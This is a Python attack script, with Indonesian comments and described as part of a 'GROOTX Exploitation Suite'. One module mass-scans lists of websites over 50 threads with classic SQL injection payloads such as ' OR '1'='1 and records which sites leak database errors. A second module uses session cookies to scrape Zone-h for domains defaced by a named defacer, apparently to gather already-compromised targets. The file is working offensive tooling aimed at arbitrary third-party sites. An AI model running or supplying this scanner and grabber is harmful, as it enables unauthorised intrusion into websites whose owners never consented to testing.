#!/usr/bin/env python3
"""
SQLI INJECTOR & ZONE-H GRABBER MODULE v1.0
==========================================
SQL Injection injector dan Zone-h defacement grabber
Diadaptasi dari AlienExploit Tool8 & Tool11
Diintegrasikan ke GROOTX Exploitation Suite
"""

import requests
import re
import os
import sys
import json
import time
import threading
import urllib3
from concurrent.futures import ThreadPoolExecutor, as_completed
from rich.console import Console
from rich.progress import Progress, SpinnerColumn, BarColumn, TextColumn, TimeElapsedColumn
from rich.table import Table

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
console = Console()

# ═══════════════════════════════════════════════════════════════
# CONFIGURATION
# ═══════════════════════════════════════════════════════════════
THREADS = 50
TIMEOUT = 10

HEADERS = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
    'Accept-Language': 'en-US,en;q=0.5',
    'Accept-Encoding': 'gzip, deflate',
    'Content-Type': 'application/x-www-form-urlencoded'
}

# ═══════════════════════════════════════════════════════════════
# SQLI INJECTOR
# ═══════════════════════════════════════════════════════════════
class SQLIInjector:
    """SQL Injection injector."""
    
    def __init__(self):
        self.results = []
        self.lock = threading.Lock()
    
    def inject(self, target):
        """Inject SQLI ke target."""
        try:
            target = target.strip().rstrip('/')
            if not target.startswith(('http://', 'https://')):
                target = 'http://' + target
            
            # Check if target has SQLI vulnerability
            # Try common SQLI payloads
            payloads = [
                "'",
                "\"",
                "' OR '1'='1",
                "' OR '1'='1' --",
                "' OR '1'='1' /*",
                "' OR 1=1",
                "' OR 1=1 --",
                "' OR 1=1 /*",
                "1' OR '1'='1",
                "1' OR '1'='1' --",
                "1' OR '1'='1' /*",
            ]
            
            for payload in payloads:
                try:
                    # Try GET parameter
                    r = requests.get(f'{target}?id={payload}', headers=HEADERS, timeout=TIMEOUT, verify=False)
                    
                    # Check for SQL errors
                    sql_errors = [
                        'sql syntax',
                        'mysql_fetch',
                        'mysql_num_rows',
                        'mysql_error',
                        'pg_query',
                        'pg_exec',
                        'sqlite_query',
                        'sqlite_error',
                        'ORA-',
                        'PLS-',
                        'SQL Server',
                        'ODBC',
                        'JDBC',
                        'syntax error',
                        'unclosed quotation mark',
                        'quoted string not properly terminated',
                    ]
                    
                    for error in sql_errors:
                        if error.lower() in r.text.lower():
                            result = {
                                'target': target,
                                'payload': payload,
                                'error': error,
                                'type': 'GET'
                            }
                            with self.lock:
                                self.results.append(result)
                            console.print(f"  [green]✓ SQLI FOUND: {target} | Payload: {payload} | Error: {error}[/green]")
                            return True, result
                    
                    # Try POST parameter
                    r = requests.post(target, data={'id': payload}, headers=HEADERS, timeout=TIMEOUT, verify=False)
                    
                    for error in sql_errors:
                        if error.lower() in r.text.lower():
                            result = {
                                'target': target,
                                'payload': payload,
                                'error': error,
                                'type': 'POST'
                            }
                            with self.lock:
                                self.results.append(result)
                            console.print(f"  [green]✓ SQLI FOUND: {target} | Payload: {payload} | Error: {error}[/green]")
                            return True, result
                except:
                    continue
            
            console.print(f"  [red]✗ {target} - No SQLI found[/red]")
            return False, None
        except:
            return False, None
    
    def mass_inject(self, targets, threads=THREADS):
        """Mass SQLI injection."""
        console.print(f"\n[bold cyan]MASS SQLI INJECTION[/bold cyan]")
        console.print(f"  Targets: {len(targets)}")
        console.print(f"  Threads: {threads}")
        
        os.makedirs('result', exist_ok=True)
        
        with Progress(
            SpinnerColumn(), TextColumn("[progress.description]{task.description}"),
            BarColumn(bar_width=40), TextColumn("[progress.percentage]{task.percentage:>3.0f}%"),
            TimeElapsedColumn(), console=console
        ) as progress:
            task = progress.add_task("[cyan]Injecting...", total=len(targets))
            
            with ThreadPoolExecutor(max_workers=threads) as executor:
                futures = {executor.submit(self.inject, target): target for target in targets}
                for future in as_completed(futures):
                    progress.update(task, advance=1)
                    try:
                        future.result()
                    except:
                        pass
        
        # Summary
        console.print(f"\n[bold green]SQLI INJECTION COMPLETE[/bold green]")
        console.print(f"  Total targets: {len(targets)}")
        console.print(f"  Vulnerable: {len(self.results)}")
        
        if self.results:
            table = Table(title="SQLI Results")
            table.add_column("Target", width=40)
            table.add_column("Payload", width=20)
            table.add_column("Error", width=20)
            table.add_column("Type", width=10)
            for r in self.results:
                table.add_row(r['target'], r['payload'], r['error'], r['type'])
            console.print(table)
        
        # Save results
        with open('result/sqli_results.json', 'w') as f:
            json.dump(self.results, f, indent=2)
        
        return self.results


# ═══════════════════════════════════════════════════════════════
# ZONE-H GRABBER
# ═══════════════════════════════════════════════════════════════
class ZoneHGrabber:
    """Zone-h defacement grabber."""
    
    def __init__(self):
        self.results = []
        self.lock = threading.Lock()
    
    def grab(self, defacer=None, zh=None, phpsessid=None, zhe=None, pages=50):
        """Grab defaced URLs dari Zone-h."""
        console.print(f"\n[bold cyan]ZONE-H GRABBER[/bold cyan]")
        console.print(f"  Defacer: {defacer}")
        console.print(f"  Pages: {pages}")
        
        if not all([defacer, zh, phpsessid, zhe]):
            console.print("[red]Error: defacer, zh, phpsessid, zhe required[/red]")
            return []
        
        for page in range(1, pages + 1):
            try:
                url = f'http://zone-h.com/archive/notifier={defacer}/page={page}'
                cookies = {
                    'ZHE': zhe,
                    'ZH': zh,
                    'PHPSESSID': phpsessid
                }
                
                r = requests.get(url, cookies=cookies, headers=HEADERS, timeout=TIMEOUT, verify=False)
                
                # Extract URLs
                urls = re.findall(r'<td>(.*)\n\t\t\t\t\t\t\t</td>', r.text)
                
                for url in urls:
                    domain = url.split('/')[0]
                    with self.lock:
                        self.results.append({
                            'domain': domain,
                            'url': url,
                            'page': page
                        })
                    console.print(f"  [green]✓ {domain}[/green]")
                
                if page % 10 == 0:
                    console.print(f"  [cyan]Page {page}/{pages}[/cyan]")
                
                time.sleep(0.5)
            except Exception as e:
                console.print(f"  [red]✗ Page {page} - Error: {str(e)[:50]}[/red]")
                continue
        
        # Summary
        console.print(f"\n[bold green]ZONE-H GRAB COMPLETE[/bold green]")
        console.print(f"  Total URLs: {len(self.results)}")
        
        if self.results:
            table = Table(title="Zone-h Results")
            table.add_column("Domain", width=30)
            table.add_column("URL", width=40)
            table.add_column("Page", justify="right", width=10)
            for r in self.results[:20]:
                table.add_row(r['domain'], r['url'], str(r['page']))
            console.print(table)
        
        # Save results
        os.makedirs('result', exist_ok=True)
        with open('result/zoneh_results.json', 'w') as f:
            json.dump(self.results, f, indent=2)
        
        return self.results


def main():
    """CLI interface"""
    import argparse
    parser = argparse.ArgumentParser(description="SQLI Injector & Zone-h Grabber")
    parser.add_argument("-l", "--list", help="Target list file")
    parser.add_argument("-t", "--target", help="Single target")
    parser.add_argument("--mode", default="sqli", choices=["sqli", "zoneh", "all"])
    parser.add_argument("--threads", type=int, default=THREADS)
    parser.add_argument("--defacer", help="Zone-h defacer name")
    parser.add_argument("--zh", help="Zone-h ZH cookie")
    parser.add_argument("--phpsessid", help="Zone-h PHPSESSID cookie")
    parser.add_argument("--zhe", help="Zone-h ZHE cookie")
    parser.add_argument("--pages", type=int, default=50, help="Zone-h pages to grab")
    args = parser.parse_args()
    
    if args.mode in ('sqli', 'all'):
        targets = []
        if args.list:
            with open(args.list) as f:
                targets = [l.strip() for l in f if l.strip()]
        elif args.target:
            targets = [args.target]
        else:
            console.print("[red]Error: Specify -l list.txt or -t target[/red]")
            return
        
        injector = SQLIInjector()
        injector.mass_inject(targets, args.threads)
    
    if args.mode in ('zoneh', 'all'):
        grabber = ZoneHGrabber()
        grabber.grab(args.defacer, args.zh, args.phpsessid, args.zhe, args.pages)


if __name__ == "__main__":
    main()
